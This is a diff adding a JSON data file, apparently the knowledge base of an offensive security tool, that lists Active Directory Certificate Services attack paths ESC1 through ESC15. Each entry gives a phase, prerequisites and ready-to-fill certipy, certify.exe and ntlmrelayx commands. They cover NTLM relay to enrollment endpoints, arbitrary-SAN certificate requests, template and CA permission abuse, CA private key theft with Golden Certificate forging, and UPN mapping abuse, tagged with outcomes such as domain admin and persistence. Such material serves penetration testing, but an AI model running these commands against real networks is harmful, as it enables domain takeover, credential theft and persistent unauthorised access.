@@ -1,0 +1,269 @@
+{
+  "service": "adcs",
+  "description": "Active Directory Certificate Services exploitation including ESC1-ESC15 attack paths",
+  "ports": [80, 443],
+  "serviceNames": ["http", "https", "certsrv"],
+  "targetOs": ["windows"],
+  "vectors": [
+    {
+      "id": "adcs-enumeration",
+      "name": "ADCS Enumeration",
+      "phase": "reconnaissance",
+      "prerequisites": ["valid_credentials"],
+      "description": "Enumerate Certificate Authorities, templates, and PKI objects to identify misconfigurations",
+      "commands": [
+        {
+          "tool": "certutil",
+          "command": "certutil -v -dsTemplate",
+          "description": "Display all certificate templates"
+        },
+        {
+          "tool": "certify.exe",
+          "command": "certify.exe find /vulnerable",
+          "description": "Find vulnerable certificate templates"
+        },
+        {
+          "tool": "certipy",
+          "command": "certipy find -u <user>@<domain> -p <password> -dc-ip <dc_ip>",
+          "description": "Comprehensive ADCS enumeration"
+        },
+        {
+          "tool": "ldeep",
+          "command": "ldeep ldap -u <user> -p <password> -d <domain> -s <dc_ip> templates",
+          "description": "Query certificate templates via LDAP"
+        }
+      ],
+      "outcomes": ["information_gathered"]
+    },
+    {
+      "id": "adcs-esc8-relay",
+      "name": "ESC8 - NTLM Relay to AD CS Web Enrollment",
+      "phase": "privilege_escalation",
+      "prerequisites": ["network_access"],
+      "description": "Relay NTLM authentication to AD CS HTTP endpoints to request certificates for privileged accounts",
+      "commands": [
+        {
+          "tool": "ntlmrelayx.py",
+          "command": "ntlmrelayx.py -t http://<dc_ip>/certsrv/certfnsh.asp -debug -smb2support --adcs --template DomainController",
+          "description": "Relay to AD CS web enrollment"
+        },
+        {
+          "tool": "certipy",
+          "command": "certipy relay -target http://<ip_ca>",
+          "description": "Relay NTLM to CA and obtain certificate"
+        },
+        {
+          "tool": "certipy",
+          "command": "certipy auth -pfx <certificate> -dc-ip <dc_ip>",
+          "description": "Authenticate using obtained certificate"
+        }
+      ],
+      "outcomes": ["domain_admin", "credential_access"]
+    },
+    {
+      "id": "adcs-esc1-san",
+      "name": "ESC1 - Misconfigured Certificate Template with SAN",
+      "phase": "privilege_escalation",
+      "prerequisites": ["valid_credentials"],
+      "description": "Request certificate with arbitrary Subject Alternative Name (SAN) from vulnerable template",
+      "commands": [
+        {
+          "tool": "certipy",
+          "command": "certipy req -u <user>@<domain> -p <password> -target <ca_server> -template '<vulnerable template name>' -ca <ca_name> -upn <target_user>@<domain>",
+          "description": "Request certificate with arbitrary UPN"
+        },
+        {
+          "tool": "certify.exe",
+          "command": "certify.exe request /ca:<server>\\<ca-name> /template:\"<vulnerable template name>\" /altname:\"Admin\"",
+          "description": "Request certificate specifying alternative name"
+        }
+      ],
+      "outcomes": ["privilege_escalation", "credential_access"]
+    },
+    {
+      "id": "adcs-esc3-enrollment-agent",
+      "name": "ESC3 - Enrollment Agent Template",
+      "phase": "privilege_escalation",
+      "prerequisites": ["valid_credentials"],
+      "description": "Abuse enrollment agent template to request certificates on behalf of other users",
+      "commands": [
+        {
+          "tool": "certipy",
+          "command": "certipy req -u <user>@<domain> -p <password> -target <ca_server> -template '<vulnerable template name>' -ca <ca_name>",
+          "description": "Request enrollment agent certificate"
+        },
+        {
+          "tool": "certipy",
+          "command": "certipy req -u <user>@<domain> -p <password> -target <ca_server> -template '<vulnerable template name>' -ca <ca_name> -on-behalf-of '<domain>\\<user>' -pfx <cert>",
+          "description": "Request certificate on behalf of target user"
+        }
+      ],
+      "outcomes": ["privilege_escalation"]
+    },
+    {
+      "id": "adcs-esc4-template-modification",
+      "name": "ESC4 - Certificate Template Write Privilege",
+      "phase": "privilege_escalation",
+      "prerequisites": ["valid_credentials"],
+      "description": "Modify certificate template to make it vulnerable, request certificate, then restore template",
+      "commands": [
+        {
+          "tool": "certipy",
+          "command": "certipy template -u <user>@<domain> -p '<password>' -template <vuln_template> -save-old -debug",
+          "description": "Modify template to enable ESC1"
+        },
+        {
+          "tool": "certipy",
+          "command": "certipy template -u <user>@<domain> -p '<password>' -template <vuln_template> -configuration <template>.json",
+          "description": "Restore original template configuration"
+        }
+      ],
+      "outcomes": ["privilege_escalation"]
+    },
+    {
+      "id": "adcs-esc5-pki-object-acl",
+      "name": "ESC5 - Vulnerable PKI Object Access Control",
+      "phase": "privilege_escalation",
+      "prerequisites": ["valid_credentials"],
+      "description": "Abuse write permissions on PKI objects or extract CA private key for Golden Certificate",
+      "commands": [
+        {
+          "tool": "certipy",
+          "command": "certipy ca -backup -u <user>@<domain> -hashes <hash_nt> -ca <ca_name> -debug -target <ca_ip>",
+          "description": "Backup CA private key"
+        },
+        {
+          "tool": "certipy",
+          "command": "certipy forge -ca-pfx '<adcs>.pfx' -upn administrator@<domain>",
+          "description": "Forge Golden Certificate"
+        }
+      ],
+      "outcomes": ["domain_admin", "persistence"]
+    },
+    {
+      "id": "adcs-esc6-san-flag",
+      "name": "ESC6 - EDITF_ATTRIBUTESUBJECTALTNAME2 Flag",
+      "phase": "privilege_escalation",
+      "prerequisites": ["valid_credentials"],
+      "description": "Abuse EDITF_ATTRIBUTESUBJECTALTNAME2 flag on CA to specify arbitrary SAN on any template",
+      "commands": [
+        {
+          "tool": "certipy",
+          "command": "certipy req -u <user>@<domain> -p <password> -target <ca_server> -template '<any_template>' -ca <ca_name> -upn administrator@<domain>",
+          "description": "Request certificate with arbitrary SAN when flag is set"
+        }
+      ],
+      "outcomes": ["privilege_escalation"]
+    },
+    {
+      "id": "adcs-esc7-manage-ca",
+      "name": "ESC7 - Manage CA or Manage Certificates Rights",
+      "phase": "privilege_escalation",
+      "prerequisites": ["valid_credentials"],
+      "description": "Abuse CA management permissions to approve certificate requests or enable vulnerable templates",
+      "commands": [
+        {
+          "tool": "certipy",
+          "command": "certipy ca -ca <ca_name> -add-officer '<user>' -username <user>@<domain> -password <password> -dc-ip <dc_ip> -target-ip <target_ip>",
+          "description": "Add user as certificate manager"
+        },
+        {
+          "tool": "certipy",
+          "command": "certipy ca -ca <ca_name> -enable-template '<esc1_vuln_template>' -username <user>@<domain> -password <password>",
+          "description": "Enable vulnerable template"
+        },
+        {
+          "tool": "certipy",
+          "command": "certipy ca -u <user>@<domain> -p '<password>' -ca <ca_name> -issue-request <request_id>",
+          "description": "Approve pending certificate request"
+        }
+      ],
+      "outcomes": ["privilege_escalation"]
+    },
+    {
+      "id": "adcs-esc9-certificate-mapping",
+      "name": "ESC9/ESC10 - Certificate Mapping Abuse",
+      "phase": "privilege_escalation",
+      "prerequisites": ["valid_credentials"],
+      "description": "Abuse certificate mapping by modifying UPN to impersonate other users",
+      "commands": [
+        {
+          "tool": "certipy",
+          "command": "certipy shadow auto -username <accountA>@<domain> -p <passA> -account <accountB>",
+          "description": "Automated shadow credentials with UPN modification"
+        },
+        {
+          "tool": "certipy",
+          "command": "certipy account update -username <accountA>@<domain> -password <passA> -user <accountB> -upn Administrator",
+          "description": "Modify target account UPN"
+        },
+        {
+          "tool": "certipy",
+          "command": "certipy req -username <accountB>@<domain> -hashes <hashB> -ca <ca_name> -template <vulnerable template>",
+          "description": "Request certificate with modified UPN"
+        }
+      ],
+      "outcomes": ["privilege_escalation"]
+    },
+    {
+      "id": "adcs-esc11-rpc-relay",
+      "name": "ESC11 - NTLM Relay to ICPR RPC Interface",
+      "phase": "privilege_escalation",
+      "prerequisites": ["network_access"],
+      "description": "Relay NTLM authentication to CA's RPC interface (ICPR) to request certificates",
+      "commands": [
+        {
+          "tool": "ntlmrelayx.py",
+          "command": "ntlmrelayx.py -t rpc://<ca_ip> -smb2support -rpc-mode ICPR -icpr-ca-name <ca_name>",
+          "description": "Relay NTLM to CA RPC interface"
+        },
+        {
+          "tool": "certipy",
+          "command": "certipy relay -target rpc://<ip_ca> -ca '<ca_name>'",
+          "description": "Relay and obtain certificate via RPC"
+        },
+        {
+          "tool": "certipy",
+          "command": "certipy auth -pfx <certificate> -dc-ip <dc_ip>",
+          "description": "Authenticate using relayed certificate"
+        }
+      ],
+      "outcomes": ["domain_admin", "credential_access"]
+    },
+    {
+      "id": "adcs-esc13-policy-issuance",
+      "name": "ESC13 - Issuance Policy Abuse",
+      "phase": "privilege_escalation",
+      "prerequisites": ["valid_credentials"],
+      "description": "Abuse issuance policies and certificate templates with OID group linking",
+      "commands": [
+        {
+          "tool": "certipy",
+          "command": "certipy req -u <user>@<domain> -p <password> -target <ca_server> -template '<vulnerable template name>' -ca <ca_name>",
+          "description": "Request certificate from template with issuance policy"
+        }
+      ],
+      "outcomes": ["privilege_escalation"]
+    },
+    {
+      "id": "adcs-esc15-application-policies",
+      "name": "ESC15 - Application Policies Requirement Bypass",
+      "phase": "privilege_escalation",
+      "prerequisites": ["valid_credentials"],
+      "description": "Abuse version 1 templates that allow enrollment to specify custom application policies",
+      "commands": [
+        {
+          "tool": "certipy",
+          "command": "certipy req -u <user>@<domain> -p <password> -target <ca_server> -template '<version 1 template with enrolee flag>' -ca <ca_name> -upn <target_user>@<domain> --application-policies 'Client Authentication'",
+          "description": "Request certificate with custom application policy"
+        },
+        {
+          "tool": "certipy",
+          "command": "certipy req -u <user>@<domain> -p <password> -target <ca_server> -template '<version 1 template with enrolee flag>' -ca <ca_name> --application-policies 'Certificate Request Agent'",
+          "description": "Request enrollment agent certificate"
+        }
+      ],
+      "outcomes": ["privilege_escalation"]
+    }
+  ]
+}
